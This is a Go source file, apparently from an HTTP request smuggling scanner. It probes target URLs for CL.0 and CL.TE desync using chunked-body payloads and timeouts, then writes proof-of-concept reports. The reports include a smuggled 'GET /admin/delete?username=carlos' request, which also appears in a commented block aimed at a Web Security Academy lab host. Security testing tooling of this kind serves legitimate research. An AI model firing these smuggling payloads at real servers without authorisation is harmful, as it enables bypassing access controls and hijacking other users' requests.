package smuggler

import (
	"fmt"
	"smuggler/config"
	"smuggler/smuggler/h1"
	"smuggler/smuggler/tests"

	"github.com/rs/zerolog/log"
)

type CL struct {
	*DesyncerImpl
}

// here all CL... tests are run
func (cl *CL) Run() bool {
	if config.Glob.Concurrent {
		defer cl.Wg.Done()
	}
	if !cl.H1Supported {
		return false
	}

	if config.Glob.ExitEarly {
		return cl.runCL0() || cl.runCLTE() // for now
	} else {
		cl.runCL0()
		cl.runCLTE()
	}
	return true
}

func (cl *CL) runCL0() bool {
	ret, _ := cl.H1Test(cl.NewPl("Content-Length: 40"))
	log.Info().Str("endpoint", cl.URL.String()).Msg("Running CL.0 desync tests...")

	if ret == 1 {
		log.Info().
			Str("endpoint", cl.URL.String()).
			Str("status", "undetermined").
			Msg("Server might be vulnerable to CL.) desync attack. Further investigate manually")
		// in this case, make another request and read response (make multiple requests and read multiple responses)
		// body := "\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: 0a40000c03e54dcc82810b30007e000e.web-security-academy.net\r\n\r\n"
		// pl := cl.NewPl(fmt.Sprintf("Content-Length: %d", len(body)))
		// pl.Body = body
		// cl.H1Test(pl)
		return true
	}
	log.Debug().Msg("Nothing found")
	return true
}

func (cl *CL) runCLTE() bool {
	log.Info().Str("endpoint", cl.URL.String()).Msg("Running CL.TE desync tests...")
	generator := tests.Generator{}
	payload := generator.Generate(tests.TE, config.Glob.Test)

	ctr := 0
	for k, vv := range payload {
		for _, v := range vv {
			payload := cl.NewPl(fmt.Sprintf("%s:%s", k, v)) // header key-value pair to be directly added in request hdr
			if cl.clte(payload) {
				ctr++
				if config.Glob.ExitEarly {
					log.Info().
						Str("endpoint", cl.URL.String()).
						Str("status", "success").
						Msgf("Test stopped on success: PoC payload stored in /result/%s directory", cl.URL.Hostname())
					if config.Glob.Concurrent {
						cl.TestDone <- struct{}{}
					}
					return true
				}
			}
			if config.Glob.Concurrent {
				select {
				case <-cl.Ctx.Done():
					return false
				default:
				}
			}
		}
	}
	if ctr > 0 { // if eos, it shouldn't even come here on success
		log.Info().
			Str("endpoint", cl.URL.String()).
			Str("status", "success").
			Msgf("finished CL.TE desync tests: PoC payload stored in /result/%s directory", cl.URL.Hostname())
	} else {
		log.Info().
			Str("endpoint", cl.URL.String()).
			Str("status", "failure").
			Msg("finished CL.TE desync tests: no issues found")
	}
	return false
}

// i may have a list of body payloads to try
func (d *CL) clte(p *h1.Payload) bool {
	p.Body = "1\r\nG\r\n0\r\n\r\n"
	p.Cl = 4

	ctr := 0
	for {
		ret, err := d.H1Test(p)
		if ret != 1 {
			if ret == -1 {
				log.Debug().
					Str("endpoint", d.URL.String()).
					Str("payload", p.HdrPl).Err(err).Msg("")
			} else if ret == 2 {
				log.Debug().
					Str("endpoint", d.URL.String()).
					Msg("disconnected before timeout")
			}
			return false // normal response (no desync)
		}
		p.Cl = 11
		ret2, err := d.H1Test(p)
		if ret2 == -1 {
			log.Debug().
				Str("endpoint", d.URL.String()).Err(err).Msg("")
			return false
		}
		p.Cl = 4
		if ret2 == 0 {
			ctr++
			if ctr < 3 {
				continue
			}
			log.Info().
				Str("endpoint", d.URL.String()).
				Msgf("Potential CL.TE issue found - %s@%s://%s%s", d.Method,
					d.URL.Scheme, d.URL.Host, d.URL.Path)
			inner := "GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 50\r\n\r\n"
			tmp := fmt.Sprintf("1\r\nA\r\n0\r\n\r\n%s", inner) // host would be taken from a url given by the user
			p.Body = tmp
			p.Cl = len(p.Body)
			// d.H1Test(p) //
			// d.H1Test(p) // to make sure the queued req proceeds
			d.GenReport(p)
			return true
		}
		log.Debug().
			Str("endpoint", d.URL.String()).
			Str("payload", p.HdrPl).
			Err(err).Msg("CLTE timeout on both length 4 and 11")
		return false
	}
}
